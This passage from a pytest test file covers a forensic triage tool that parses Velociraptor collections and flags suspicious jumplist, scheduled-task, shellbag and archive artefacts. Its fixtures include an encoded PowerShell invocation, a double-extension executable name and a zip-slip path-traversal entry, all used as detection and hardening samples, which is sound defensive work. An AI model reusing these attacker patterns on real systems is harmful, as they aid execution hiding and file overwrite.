    assert rows[0]["LocalPath"] == "C:\\Users\\dfir\\AppData\\Local\\Temp\\runme.ps1"
    assert audit["lnk_streams_parsed"] >= 1
    assert isinstance(warnings, list)


def test_raw_jumplist_desktop_document_is_contextual_not_suspicious() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\5f7b5f1e01b83767.automaticDestinations-ms",
        "AppId": "5f7b5f1e01b83767",
        "LocalPath": "C:\\Users\\dfir\\Desktop\\Parseado\\2025-05-02T09_28_02_0147189_ConsoleLog.txt",
        "SourceFileMtime": "2026-05-10T10:15:00Z",
        "ParseMethod": "lnk_stream",
    }
    artifact_meta = {
        "artifact_type": "jumplist",
        "parser": "raw_automatic_destinations",
        "source_tool": "velociraptor_raw",
        "source_format": "automaticDestinations-ms",
        "source_path": row["SourceFile"],
        "velociraptor_original_path": "C%3A/Users/dfir/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/5f7b5f1e01b83767.automaticDestinations-ms",
        "velociraptor_normalized_windows_path": row["SourceFile"],
        "name": "JumpList raw - 5f7b5f1e01b83767.automaticDestinations-ms",
    }
    document = normalize_row("case-1", "ev-1", "art-1", row, artifact_meta)
    tags = set(document.get("tags") or [])
    assert "user_writable_path" in tags
    assert "document" in tags
    assert "suspicious" not in tags
    assert "suspicious_path" not in tags
    assert document["event"]["severity"] == "info"
    assert int(document["risk_score"]) <= 15
    assert document["timestamp_precision"] == "source_file_mtime"
    assert document["jumplist"]["timestamp_interpretation"]
    assert document["velociraptor"]["original_path"] == artifact_meta["velociraptor_original_path"]
    assert document["velociraptor"]["normalized_windows_path"] == row["SourceFile"]
    assert document["velociraptor"]["artifact_category"] == "jumplist"
    assert document["velociraptor"]["parser_status"] == "parsed"


def test_raw_jumplist_script_in_temp_is_suspicious() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\5f7b5f1e01b83767.automaticDestinations-ms",
        "AppId": "powershell.exe",
        "LocalPath": "C:\\Users\\dfir\\AppData\\Local\\Temp\\runme.ps1",
        "Arguments": "powershell -NoP -enc QQ==",
    }
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {"artifact_type": "jumplist", "parser": "raw_automatic_destinations", "source_tool": "velociraptor_raw", "source_path": row["SourceFile"], "name": "jl.raw"},
    )
    tags = set(document.get("tags") or [])
    assert "suspicious" in tags
    assert "suspicious_path" in tags
    assert "script" in tags
    assert document["event"]["severity"] == "medium"
    assert int(document["risk_score"]) >= 58


def test_raw_jumplist_double_extension_is_high_risk() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\5f7b5f1e01b83767.automaticDestinations-ms",
        "AppId": "msedge.exe",
        "LocalPath": "C:\\Users\\dfir\\Downloads\\invoice.pdf.exe",
    }
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {"artifact_type": "jumplist", "parser": "raw_automatic_destinations", "source_tool": "velociraptor_raw", "source_path": row["SourceFile"], "name": "jl.raw"},
    )
    tags = set(document.get("tags") or [])
    assert "double_extension" in tags
    assert "suspicious" in tags
    assert int(document["risk_score"]) >= 75
    assert any("double extension" in reason.lower() for reason in document.get("suspicious_reasons") or [])


def test_raw_jumplist_unresolved_app_id_is_data_quality_not_error() -> None:
    row = {
        "SourceFile": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\f01b4d95cf55d32a.automaticDestinations-ms",
        "AppId": "f01b4d95cf55d32a",
        "LocalPath": "C:\\Users\\dfir\\Documents\\notes.txt",
    }
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        row,
        {"artifact_type": "jumplist", "parser": "raw_automatic_destinations", "source_tool": "velociraptor_raw", "source_path": row["SourceFile"], "name": "jl.raw"},
    )
    assert document["jumplist"]["app_name"] == "f01b4d95cf55d32a"
    assert "unresolved_jumplist_app_id" in (document.get("data_quality") or [])


def test_base_document_includes_destination_namespace() -> None:
    document = normalize_row("case-1", "ev-1", "art-1", {}, {"artifact_type": "generic_csv", "name": "x.csv", "source_path": "x.csv", "parser": "generic_csv"})
    assert "destination" in document
    assert document["destination"]["hostname"] is None


def test_normalize_row_evtx_raw_without_name_uses_source_path_fallback() -> None:
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "EventID": "1",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Provider": "Microsoft-Windows-Sysmon",
            "Computer": "hosta.example.local",
        },
        {
            "artifact_type": "windows_event",
            "parser": "evtx_raw",
            "source_tool": "native_evtx",
            "source_format": "evtx",
            "source_path": r"C:\Windows\System32\winevt\Logs\Sysmon_UACME_64.evtx",
        },
    )
    assert document["windows"]["event_id"] == 1
    assert document["host"]["name"] == "hosta.example.local"


def test_list_velociraptor_artifacts_uses_raw_jumplist_parsers() -> None:
    root = Path(__file__).parent / "fixtures" / "jumplists" / "velociraptor_collection_jumplists"
    discovery = discover_velociraptor_evidences(root)
    selected = [candidate.as_dict() for candidate in discovery.candidates if candidate.category == "jumplist"]
    artifacts = list_velociraptor_upload_artifacts(root, selected)
    automatic = next(item for item in artifacts if item.get("source_format") == "automaticDestinations-ms")
    custom = next(item for item in artifacts if item.get("source_format") == "customDestinations-ms")
    assert automatic["parser"] == "raw_automatic_destinations"
    assert automatic["source_tool"] == "velociraptor_raw"
    assert custom["parser"] == "raw_custom_destinations"


def test_scheduled_task_xml_parser_falls_back_on_malformed_xml(tmp_path: Path) -> None:
    task_dir = tmp_path / "uploads" / "auto" / "C%3A" / "Windows" / "System32" / "Tasks" / "Microsoft"
    task_dir.mkdir(parents=True)
    task_file = task_dir / "Broken Task"
    task_file.write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<Task>
  <RegistrationInfo><Author>Microsoft</Author></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\\Windows\\System32\\cmd.exe</Command>
      <Arguments>/c echo a & b</Arguments>
    </Exec>
  </Actions>
</Task>
""",
        encoding="utf-8",
    )
    row, warnings = parse_scheduled_task_xml(task_file, source_path=str(task_file))
    assert row["TaskName"] == "Broken Task"
    assert row["Command"] == "C:\\Windows\\System32\\cmd.exe"
    assert "echo a" in str(row["Arguments"] or "")
    assert warnings


def test_velociraptor_zip_inventory_discovers_browser_without_full_extraction(tmp_path: Path) -> None:
    archive_path = tmp_path / "velociraptor.zip"
    history_path = "uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History"
    wal_path = f"{history_path}-wal"
    shm_path = f"{history_path}-shm"
    with zipfile.ZipFile(archive_path, "w") as archive:
        for index in range(1000):
            archive.writestr(f"uploads/auto/C%3A/Users/alex/AppData/Local/Temp/noise-{index}.tmp", "x")
        archive.writestr(history_path, "history")
        archive.writestr(wal_path, "wal")
        archive.writestr(shm_path, "shm")

    container = open_evidence_container(archive_path)
    discovery = discover_velociraptor_evidences(container)
    browser_candidates = [candidate for candidate in discovery.candidates if candidate.category == "browser"]
    assert len(browser_candidates) == 1
    candidate = browser_candidates[0]
    assert candidate.browser == "Chrome"
    assert candidate.original_path == history_path
    assert set(candidate.companion_files) == {wal_path, shm_path}
    destination = tmp_path / "staging"
    results = container.extract_entries([candidate.original_path, *candidate.companion_files], destination)
    extracted_paths = {entry["path"] for entry in results if entry["status"] == "extracted"}
    assert extracted_paths == {history_path, wal_path, shm_path}
    assert not (destination / "uploads/auto/C%3A/Users/alex/AppData/Local/Temp/noise-1.tmp").exists()


def test_velociraptor_zip_inventory_ignores_macos_metadata(tmp_path: Path) -> None:
    archive_path = tmp_path / "macos-noise.zip"
    history_path = "uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("__MACOSX/C%3A/Users/alex/foo", "x")
        archive.writestr(".DS_Store", "x")
        archive.writestr("uploads/auto/C%3A/Users/alex/._History", "x")
        archive.writestr(history_path, "history")
    container = open_evidence_container(archive_path)
    entries = container.list_entries()
    ignored_paths = {entry.path: entry.reason for entry in entries if entry.ignored}
    assert "__MACOSX/C%3A/Users/alex/foo" in ignored_paths
    assert ignored_paths["__MACOSX/C%3A/Users/alex/foo"] == "ignored_macos_directory"
    assert ".DS_Store" in ignored_paths
    assert "uploads/auto/C%3A/Users/alex/._History" in ignored_paths
    discovery = discover_velociraptor_evidences(container)
    assert all("__MACOSX" not in candidate.original_path for candidate in discovery.candidates)


def test_velociraptor_zip_inventory_ignores_appledouble_evtx_entries(tmp_path: Path) -> None:
    archive_path = tmp_path / "macos-evtx-noise.zip"
    real_evtx_path = "uploads/auto/C%3A/Windows/System32/winevt/Logs/Security.evtx"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("__MACOSX/uploads/auto/C%3A/Windows/System32/winevt/Logs/._Security.evtx", "noise")
        archive.writestr("uploads/auto/C%3A/Windows/System32/winevt/Logs/._Application.evtx", "noise")
        archive.writestr(real_evtx_path, "real")
    container = open_evidence_container(archive_path)
    discovery = discover_velociraptor_evidences(container)
    evtx_candidates = [candidate for candidate in discovery.candidates if candidate.parser == "evtx_raw"]
    assert len(evtx_candidates) == 1
    assert evtx_candidates[0].original_path == real_evtx_path


def test_velociraptor_7z_inventory_discovers_browser_without_full_extraction(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    archive_path = tmp_path / "velociraptor.7z"
    archive_path.write_bytes(b"dummy")
    history_path = "uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History"
    wal_path = f"{history_path}-wal"
    shm_path = f"{history_path}-shm"

    def fake_run_7z(args: list[str], *, input_bytes: bytes | None = None) -> subprocess.CompletedProcess[bytes]:
        assert input_bytes is None
        if args[:2] == ["l", "-slt"]:
            listing = f"""
Listing archive: {archive_path}

--
Path = {archive_path}
Type = 7z
Physical Size = 123
Headers Size = 64
Solid = -
Blocks = 1

----------
Path = {history_path}
Size = 7
Packed Size = 5
Modified = 2026-05-20 10:00:00
Attributes = A
Encrypted = -
Comment =
CRC = 00000000
Method = LZMA2:12
Block = 0

Path = {wal_path}
Size = 3
Packed Size = 3
Modified = 2026-05-20 10:00:01
Attributes = A
Encrypted = -
Comment =
CRC = 00000000
Method = LZMA2:12
Block = 0

Path = {shm_path}
Size = 3
Packed Size = 3
Modified = 2026-05-20 10:00:02
Attributes = A
Encrypted = -
Comment =
CRC = 00000000
Method = LZMA2:12
Block = 0
""".strip()
            return subprocess.CompletedProcess(["7z", *args], 0, stdout=listing.encode("utf-8"), stderr=b"")
        if args[:2] == ["x", "-so"]:
            requested = args[-1]
            payload = {
                history_path: b"history",
                wal_path: b"wal",
                shm_path: b"shm",
            }[requested]
            return subprocess.CompletedProcess(["7z", *args], 0, stdout=payload, stderr=b"")
        raise AssertionError(f"Unexpected 7z args: {args}")

    monkeypatch.setattr(zip_inventory, "_run_7z_command", fake_run_7z)

    container = open_evidence_container(archive_path)
    discovery = discover_velociraptor_evidences(container)
    browser_candidates = [candidate for candidate in discovery.candidates if candidate.category == "browser"]
    assert len(browser_candidates) == 1
    candidate = browser_candidates[0]
    assert candidate.browser == "Chrome"
    assert candidate.original_path == history_path
    assert set(candidate.companion_files) == {wal_path, shm_path}
    destination = tmp_path / "staging-7z"
    results = container.extract_entries([candidate.original_path, *candidate.companion_files], destination)
    extracted_paths = {entry["path"] for entry in results if entry["status"] == "extracted"}
    assert extracted_paths == {history_path, wal_path, shm_path}
    assert (destination / history_path).read_bytes() == b"history"


@pytest.mark.parametrize("archive_name", ["velociraptor.rar", "velociraptor.tar.gz", "velociraptor.tgz"])
def test_velociraptor_common_archives_use_7z_container(monkeypatch: pytest.MonkeyPatch, tmp_path: Path, archive_name: str) -> None:
    archive_path = tmp_path / archive_name
    archive_path.write_bytes(b"dummy")
    history_path = "uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History"

    def fake_run_7z(args: list[str], *, input_bytes: bytes | None = None) -> subprocess.CompletedProcess[bytes]:
        assert input_bytes is None
        assert args[:2] == ["l", "-slt"]
        listing = f"""
Listing archive: {archive_path}

--
Path = {archive_path}
Type = archive

----------
Path = {history_path}
Size = 7
Packed Size = 5
Modified = 2026-05-20 10:00:00
Attributes = A
Encrypted = -
Comment =
CRC = 00000000
Method = store
Block = 0
""".strip()
        return subprocess.CompletedProcess(["7z", *args], 0, stdout=listing.encode("utf-8"), stderr=b"")

    monkeypatch.setattr(zip_inventory, "_run_7z_command", fake_run_7z)

    container = open_evidence_container(archive_path)
    assert container.type == "7z"
    entries = container.list_entries()
    assert [entry.path for entry in entries] == [history_path]


def test_safe_zip_mtime_tolerates_invalid_zero_month_day() -> None:
    assert _safe_zip_mtime((1980, 0, 0, 0, 0, 0)) is None
    assert _safe_zip_mtime((1980, 1, 1, 0, 0, 0)) == "1980-01-01T00:00:00+00:00"


def test_raw_collection_autoroute_with_invalid_zip_member_timestamp(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    archive_path = tmp_path / "invalid-ts-velociraptor.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("results/Windows.Triage.Targets%2FSearchGlobs.csv", "foo,bar\n1,2\n")
        archive.writestr("uploads/auto/C%3A/Users/alex/NTUSER.DAT", "x")

    original_infolist = zipfile.ZipFile.infolist

    def patched_infolist(self):
        members = original_infolist(self)
        if members:
            members[0].date_time = (1980, 0, 0, 0, 0, 0)
        return members

    monkeypatch.setattr(zipfile.ZipFile, "infolist", patched_infolist)

    container = open_evidence_container(archive_path)
    entries = [entry.path for entry in container.list_entries() if not entry.is_dir]
    assert _looks_like_raw_collection_entries(entries)
    assert _should_route_to_raw_collection_discovery(archive_path, entries)


def test_shellbags_fixture_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "shellbags" / "sbecmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "shellbags", "name": path.name, "source_path": str(path), "parser": "sbecmd"})
    assert len(docs) >= 8
    network_doc = next(doc for doc in docs if doc["shellbag"]["is_network_path"])
    usb_doc = next(doc for doc in docs if doc["shellbag"]["is_usb_path"])
    cloud_doc = next(doc for doc in docs if "cloud_sync" in set(doc["tags"]))
    suspicious_doc = next(doc for doc in docs if "suspicious_path" in set(doc["tags"]))
    missing_doc = next(doc for doc in docs if "missing_shellbag_path" in set(doc.get("data_quality", [])))
    deleted_doc = next(doc for doc in docs if "deleted_or_missing_candidate" in set(doc["tags"]))
    assert network_doc["network"]["destination_hostname"] == "fileserver"
    assert network_doc["network"]["share_name"] == "share"
    assert usb_doc["volume"]["drive_type"] == "removable"
    assert cloud_doc["file"]["path"] == "C:\\Users\\alex\\OneDrive\\Documents"
    assert suspicious_doc["file"]["path"] == "C:\\Users\\alex\\AppData\\Local\\Temp\\payload"
    assert missing_doc["shellbag"]["path"] is None
    assert deleted_doc["shellbag"]["is_deleted"] is True
    assert all("raw" in doc for doc in docs)


def test_shellbags_activity_and_correlation() -> None:
    path = Path(__file__).parent / "fixtures" / "shellbags" / "sbecmd_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "shellbags", "name": path.name, "source_path": str(path), "parser": "sbecmd"})
    network_doc = next(doc for doc in docs if doc["shellbag"]["is_network_path"])
    download_doc = {
        "id": "download-1",
        "@timestamp": "2026-05-09T11:16:00+00:00",
        "event": {"type": "file_downloaded", "severity": "info", "message": "Browser download"},
        "artifact": {"type": "browser"},
        "host": {"name": network_doc["host"]["name"]},
        "user": {"name": network_doc["user"]["name"]},
        "file": {"path": "\\\\fileserver\\share\\docs\\report.zip", "name": "report.zip"},
        "download": {"target_path": "\\\\fileserver\\share\\docs\\report.zip", "file_name": "report.zip"},
        "tags": ["download"],
        "suspicious_reasons": [],
    }
    activities = []
    for doc in [network_doc, download_doc]:
        activities.extend(event_to_activity(doc))
    correlated = correlate_shellbags(activities)
    activity_types = {item.activity_type for item in correlated}
    assert "folder_accessed" in activity_types
    assert "network_folder_accessed" in activity_types
    assert "folder_related_to_deleted_download" in activity_types


def test_velociraptor_firefox_extracts_places_with_wal_and_shm(tmp_path: Path) -> None:
    archive_path = tmp_path / "firefox.zip"
    places_path = "uploads/auto/C%3A/Users/alex/AppData/Roaming/Mozilla/Firefox/Profiles/abcd.default-release/places.sqlite"
    wal_path = f"{places_path}-wal"
    shm_path = f"{places_path}-shm"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(places_path, "sqlite")
        archive.writestr(wal_path, "wal")
        archive.writestr(shm_path, "shm")
    container = open_evidence_container(archive_path)
    discovery = discover_velociraptor_evidences(container)
    candidate = next(item for item in discovery.candidates if item.artifact_type == "firefox_places")
    results = container.extract_entries([candidate.original_path, *candidate.companion_files], tmp_path / "staging")
    assert {entry["path"] for entry in results if entry["status"] == "extracted"} == {places_path, wal_path, shm_path}


def test_velociraptor_directory_container_supports_selective_browser_copy(tmp_path: Path) -> None:
    root = tmp_path / "collection"
    history = root / "uploads" / "auto" / "C%3A" / "Users" / "alex" / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History"
    history.parent.mkdir(parents=True)
    history.write_text("history", encoding="utf-8")
    (history.parent / "History-wal").write_text("wal", encoding="utf-8")
    (history.parent / "History-shm").write_text("shm", encoding="utf-8")
    (root / "uploads" / "auto" / "C%3A" / "Users" / "alex" / "Desktop" / "other.bin").parent.mkdir(parents=True, exist_ok=True)
    (root / "uploads" / "auto" / "C%3A" / "Users" / "alex" / "Desktop" / "other.bin").write_text("x", encoding="utf-8")

    container = open_evidence_container(root)
    discovery = discover_velociraptor_evidences(container)
    candidate = next(item for item in discovery.candidates if item.category == "browser")
    destination = tmp_path / "staging"
    results = container.extract_entries([candidate.original_path, *candidate.companion_files], destination)
    assert sum(1 for entry in results if entry["status"] == "extracted") == 3
    assert not (destination / "uploads/auto/C%3A/Users/alex/Desktop/other.bin").exists()


def test_velociraptor_zip_container_blocks_zip_slip_entry(tmp_path: Path) -> None:
    archive_path = tmp_path / "slip.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("../evil.txt", "x")
    container = open_evidence_container(archive_path)
    result = container.extract_entries(["../evil.txt"], tmp_path / "staging")[0]
    assert result["status"] == "failed"


def test_scheduled_task_xml_normalization_parses_exec_details() -> None:
    path = Path(__file__).parent / "fixtures" / "scheduled_tasks" / "suspicious_powershell_encoded.xml"
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "scheduled_task", "name": path.name, "source_path": str(path), "parser": "scheduled_task_xml", "source_tool": "native_scheduled_task", "source_format": "xml"})[0]
    assert doc["artifact"]["type"] == "scheduled_task"
    assert doc["artifact"]["parser"] == "scheduled_task_xml"
    assert doc["source_tool"] == "native_scheduled_task"
    assert doc["event"]["type"] == "scheduled_task"
    assert doc["task"]["enabled"] is True
    assert doc["task"]["hidden"] is True
    assert doc["task"]["command"].lower().endswith("powershell.exe")
    assert "EncodedCommand" in str(doc["task"]["arguments"])
    assert doc["process"]["command_line"]
    assert doc["persistence"]["mechanism"] == "scheduled_task"
    assert doc["execution"]["is_execution_confirmed"] is False
    assert "encoded_command" in doc["tags"]
    assert "logon_trigger" in doc["tags"]
    assert "hidden_task" in doc["tags"]
    assert doc["risk_score"] >= 70


def test_scheduled_task_csv_normalization_maps_name_path_and_command() -> None:
    path = Path(__file__).parent / "fixtures" / "scheduled_tasks_sample.csv"
    docs = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "scheduled_task", "name": path.name, "source_path": str(path), "parser": "csv", "source_format": "csv"})
    first = docs[0]
    assert first["task"]["name"] == "Windows Update Monitor"
    assert first["task"]["path"] == "\\Windows Update Monitor"
    assert first["task"]["command"].lower().endswith("powershell.exe")
    assert first["task"]["arguments"]
    assert first["raw"]["TaskName"] == "Windows Update Monitor"


def test_scheduled_task_unc_path_is_detected() -> None:
    path = Path(__file__).parent / "fixtures" / "scheduled_tasks" / "unc_task.xml"
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "scheduled_task", "name": path.name, "source_path": str(path), "parser": "scheduled_task_xml", "source_tool": "native_scheduled_task", "source_format": "xml"})[0]
    assert "unc_path" in doc["tags"]
    assert any("UNC path" in reason for reason in doc["suspicious_reasons"])


def test_scheduled_task_com_handler_is_detected() -> None:
    path = Path(__file__).parent / "fixtures" / "scheduled_tasks" / "comhandler_task.xml"
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "scheduled_task", "name": path.name, "source_path": str(path), "parser": "scheduled_task_xml", "source_tool": "native_scheduled_task", "source_format": "xml"})[0]
    assert doc["event"]["type"] == "scheduled_task"
    assert doc["task"]["com_handler_class_id"] == "{11111111-2222-3333-4444-555555555555}"
    assert "com_handler_task" in doc["data_quality"]
    assert "com_handler_task" in doc["tags"]
    assert "missing_command" in doc["data_quality"]


def test_scheduled_task_system_task_stays_low_risk() -> None:
    path = Path(__file__).parent / "fixtures" / "scheduled_tasks" / "benign_windows_update.xml"
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "scheduled_task", "name": path.name, "source_path": str(path), "parser": "scheduled_task_xml", "source_tool": "native_scheduled_task", "source_format": "xml"})[0]
    assert doc["event"]["type"] == "scheduled_task"
    assert doc["risk_score"] <= 20
    assert "system_path" in doc["tags"]
    assert "suspicious_path" not in doc["tags"]
    assert doc["execution"]["is_execution_confirmed"] is False


def test_scheduled_task_disabled_can_stay_off_timeline(tmp_path: Path) -> None:
    task_file = tmp_path / "disabled_task.xml"
    task_file.write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-05-03T11:30:00Z</Date><Author>alex</Author><URI>\\Disabled Task</URI></RegistrationInfo>
  <Settings><Enabled>false</Enabled><Hidden>false</Hidden></Settings>
  <Actions Context="Author"><Exec><Command>C:\\Windows\\System32\\notepad.exe</Command></Exec></Actions>
</Task>""",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", task_file, {"artifact_type": "scheduled_task", "name": task_file.name, "source_path": str(task_file), "parser": "scheduled_task_xml", "source_tool": "native_scheduled_task", "source_format": "xml"})[0]
    assert "disabled" in doc["tags"]
    assert doc["persistence"]["enabled"] is False
    assert doc["event"]["timeline_include"] is False


def test_scheduled_task_utf16_microsoft_com_handler_is_not_suspicious(tmp_path: Path) -> None:
    task_file = tmp_path / "UnifiedConsentSyncTask"
    xml_text = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\\Microsoft\\Windows\\ConsentUX\\UnifiedConsent\\UnifiedConsentSyncTask</URI>
    <Author>Microsoft Corporation</Author>
    <Date>2026-05-09T16:16:50.497874+00:00</Date>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-5-4</GroupId>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <ComHandler>
      <ClassId>{11111111-2222-3333-4444-555555555555}</ClassId>
    </ComHandler>
  </Actions>
</Task>"""
    task_file.write_bytes(b"\xff\xfe" + xml_text.encode("utf-16-le"))

    row, warnings = parse_scheduled_task_xml(
        task_file,
        source_path=r"C:\Windows\System32\Tasks\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask",
    )
    assert warnings == []
    assert row["TaskXmlEncoding"] == "utf-16-le"
    assert "\x00" not in row["TaskXml"]
    assert "\x00" not in row["TaskXmlPreview"]

    doc = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        task_file,
        {
            "artifact_type": "scheduled_task",
            "name": task_file.name,
            "source_path": r"C:\Windows\System32\Tasks\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask",
            "parser": "scheduled_task_xml",
            "source_tool": "native_scheduled_task",
            "source_format": "xml",
        },
    )[0]
    assert doc["event"]["type"] == "scheduled_task"
    assert doc["risk_score"] == 0
    assert doc["event"]["severity"] == "info"
    assert doc["suspicious_reasons"] == []
    assert "com_handler_task" in doc["tags"]
    assert "scheduled_task" in doc["tags"]
    assert "autorun" in doc["tags"]
    assert "missing_command" in doc["data_quality"]
    assert "com_handler_task" in doc["data_quality"]
    assert "missing_user" not in doc["data_quality"]
    assert doc["user"]["sid"] == "S-1-5-4"
    assert doc["user"]["name"] == "INTERACTIVE"
    assert doc["persistence"]["user"] == "INTERACTIVE"
    assert doc["persistence"]["scope"] == "interactive_user"
    assert doc["raw"]["TaskXmlEncoding"] == "utf-16-le"
    assert "\x00" not in doc["raw"]["TaskXml"]
    assert "\x00" not in doc["raw"]["TaskXmlPreview"]


def test_scheduled_task_usb_path_is_not_classified_as_usb() -> None:
    path = Path(r"C:/Windows/System32/Tasks/Microsoft/Windows/USB/Usb-Notifications")
    classified = classify_artifact(path, [])
    assert classified["artifact_type"] == "scheduled_task"
    assert classified["parser"] == "scheduled_task_xml"


def test_scheduled_task_usb_notifications_end_to_end_stays_scheduled_task(tmp_path: Path) -> None:
    task_file = tmp_path / "Usb-Notifications"
    task_file.write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\\Microsoft\\Windows\\USB\\Usb-Notifications</URI>
    <Author>Microsoft Corporation</Author>
    <Date>2026-05-03T11:30:00Z</Date>
  </RegistrationInfo>
  <Actions Context="Author">
    <ComHandler><ClassId>{11111111-2222-3333-4444-555555555555}</ClassId></ComHandler>
  </Actions>
</Task>""",
        encoding="utf-8",
    )
    doc = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        task_file,
        {
            "artifact_type": "scheduled_task",
            "name": task_file.name,
            "source_path": r"C:\Windows\System32\Tasks\Microsoft\Windows\USB\Usb-Notifications",
            "parser": "scheduled_task_xml",
            "source_tool": "native_scheduled_task",
            "source_format": "xml",
        },
    )[0]
    assert doc["artifact"]["type"] == "scheduled_task"
    assert doc["artifact"]["parser"] == "scheduled_task_xml"
    assert doc["source_tool"] == "native_scheduled_task"
    assert doc["source_format"] == "xml"
    assert doc["event"]["category"] == "persistence"
    assert doc["event"]["type"] == "scheduled_task"
    assert doc["event"]["action"] == "scheduled_task_observed"
    assert "scheduled_task" in doc["tags"]
    assert "persistence" in doc["tags"]
    assert "autorun" in doc["tags"]
    assert "usb" not in doc["tags"]
    assert (doc.get("usb", {}) or {}).get("device_instance_id") is None
    assert (doc.get("usb", {}) or {}).get("artifact_type") is None


def test_scheduled_task_microsoft_windowsai_names_are_not_suspicious(tmp_path: Path) -> None:
    task_file = tmp_path / "InitialConfiguration"
    task_file.write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\\Microsoft\\Windows\\WindowsAI\\Recall\\InitialConfiguration</URI>
    <Author>Microsoft Corporation</Author>
    <Date>2026-05-03T11:30:00Z</Date>
  </RegistrationInfo>
  <Actions Context="Author">
    <Exec><Command>C:\\Windows\\System32\\svchost.exe</Command></Exec>
  </Actions>
</Task>""",
        encoding="utf-8",
    )
    doc = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        task_file,
        {
            "artifact_type": "scheduled_task",
            "name": task_file.name,
            "source_path": r"C:\Windows\System32\Tasks\Microsoft\Windows\WindowsAI\Recall\InitialConfiguration",
            "parser": "scheduled_task_xml",
            "source_tool": "native_scheduled_task",
            "source_format": "xml",
        },
    )[0]
    assert doc["event"]["type"] == "scheduled_task"
    assert "Task name looks suspicious" not in doc["suspicious_reasons"]

    task_file_2 = tmp_path / "PolicyConfiguration"
    task_file_2.write_text(task_file.read_text(encoding="utf-8").replace("InitialConfiguration", "PolicyConfiguration"), encoding="utf-8")
    doc2 = normalize_file(
        "case-1",
        "ev-1",
        "art-2",
        task_file_2,
        {
            "artifact_type": "scheduled_task",
            "name": task_file_2.name,
            "source_path": r"C:\Windows\System32\Tasks\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration",
            "parser": "scheduled_task_xml",
            "source_tool": "native_scheduled_task",
            "source_format": "xml",
        },
    )[0]
    assert "Task name looks suspicious" not in doc2["suspicious_reasons"]


def test_scheduled_task_non_microsoft_invalid_com_handler_is_suspicious(tmp_path: Path) -> None:
    task_file = tmp_path / "updater.xml"
    task_file.write_text(
        """<?xml version="1.0" encoding="UTF-8"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\\Random\\Updater</URI>
    <Author>Unknown Vendor</Author>
    <Date>2026-05-03T11:30:00Z</Date>
  </RegistrationInfo>
  <Settings>
    <Hidden>true</Hidden>
  </Settings>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <ComHandler>
      <ClassId>not-a-guid</ClassId>
    </ComHandler>
  </Actions>
</Task>""",
        encoding="utf-8",
    )
    doc = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        task_file,
        {
            "artifact_type": "scheduled_task",
            "name": task_file.name,
            "source_path": r"C:\Windows\System32\Tasks\Random\Updater",
